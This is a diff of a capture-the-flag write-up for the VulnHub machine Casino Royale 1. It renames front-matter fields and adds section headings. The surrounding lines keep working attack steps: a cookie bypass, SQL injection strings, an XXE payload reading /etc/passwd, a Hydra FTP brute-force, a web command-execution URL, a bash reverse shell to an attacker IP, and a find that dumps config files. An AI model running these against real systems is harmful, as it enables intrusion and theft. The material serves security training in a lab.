@@ -12,21 +12,21 @@ tags:
   - rce
   - reverse-shell
   - suid
-machine: Casino Royale 1
+machine: Casino Royale
 platform: Linux
 difficulty: Intermediate
-date_solved: 2026-09-22
-key_techniques:
+date: 2026-09-22
+techniques:
   - SQL injection
   - CSRF
   - XXE
   - FTP upload to RCE
   - SUID privilege escalation
 cve: []
-initial_vector: Web application with cookie bypass and SQL injection
-privilege_escalation: SUID binary mi6_detect_test runs bash -p
+initial vector: Web application with cookie bypass and SQL injection
+privilege escalation: SUID binary mi6_detect_test runs bash -p
 author: null
-writeup_url: https://www.vulnhub.com/entry/casino-royale-1,287/
+source: https://www.vulnhub.com/entry/casino-royale-1,287/
 ---
 
 - **Casino Royale 1 machine**: [https://www.vulnhub.com/entry/casino-royale-1,287/](https://www.vulnhub.com/entry/casino-royale-1,287/)
@@ -75,8 +75,9 @@ whatweb http://192.168.1.146 -v
 
 Outdated or attack-prone versions should show up. Make sure to document them.
 
-### Website
+## Exploitation
 
+### Web access via cookie handling
 During recon we find an *install/* directory that looks vulnerable; searching in *searchsploit* shows that our version, *0.13*, is in fact vulnerable to a Cookie Handling issue.
 ```bash
 searchsploit -x php/webapps/6766.txt
@@ -87,6 +88,7 @@ Thanks to the exploit we find a *pokeradmin/* path; we open the browser console 
 javascript:document.cookie = "ValidUserAdmin=admin";
 ```
 
+### SQL injection (time-based)
 That already gives us access, but let's open Burp Suite and intercept the request to see if we can change the password.
 The login form is vulnerable to SQLi: after injecting *admin' or 1=1-- -* it lets us in, and with *admin' order by 7-- -* we can tell there are 7 columns.
 Equality-based checks give us trouble because the page also treats *1=2-- -* as valid, so we build a Python script for a time-based SQLi, using comparisons like the following:
@@ -223,6 +225,7 @@ Within seconds we get a hit on the port-80 server, telling us Valenka opened the
 Now we just need to connect again and send her the HTML file.
 
 Once the HTML gives us our own admin user, in the profile of another user called "le" we find another system path that looks vulnerable to an XML attack, which we can tell from a leak in the source code of the new page (http://casino-royale.local//ultra-access-view/main.php).
+### XXE to read /etc/passwd
 For the XXE we open the PortSwigger site and Burp Suite, intercept the request to the vulnerable endpoint, take the following payload from PortSwigger together with the info leaked in the page source, and paste it into Repeater to read, for example, */etc/passwd*.
 ```html
 <?xml version="1.0" encoding="UTF-8"?>
@@ -236,6 +239,7 @@ For the XXE we open the PortSwigger site and Burp Suite, intercept the request t
  </password>
 </creds>
 ```
+### FTP brute-force and upload to RCE
 Reading the full */etc/passwd* we find an *ftpUserULTRA* that could be useful, but we don't know its password. We can use Hydra and Rockyou to brute-force it, reaching the password *bankbank* at position 48698 in the wordlist.
 ```bash
 hydra -l ftpUserULTRA -P /usr/share/wordlists/rockyou.txt ftp://192.168.18.237 -t 20
@@ -253,6 +257,7 @@ Once uploaded we give it permission 777 and can then control the cmd parameter f
 http://casino-royale.local/ultra-access-view/cmd.php3?cmd=whoami
 ```
 
+### Reverse shell
 We start a listener on port 443 from the attacker machine and build a *one-liner* in the URL. Remember to URL-encode the "&" as "%26".
 ```
 http://casino-royale.local/ultra-access-view/cmd.php3?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/192.168.18.226/443%200%3E%261%22
@@ -271,7 +276,7 @@ stty rows 44 columns 184
 
 ```
 
-### Privilege escalation
+## Privilege escalation
 On servers like this there are usually config files that store sensitive information, so we use find to locate them and cat every match with a bit of find syntax.
 ```bash
 find -name \*config\* 2>/dev/null -exec cat {} \; | less -S -r
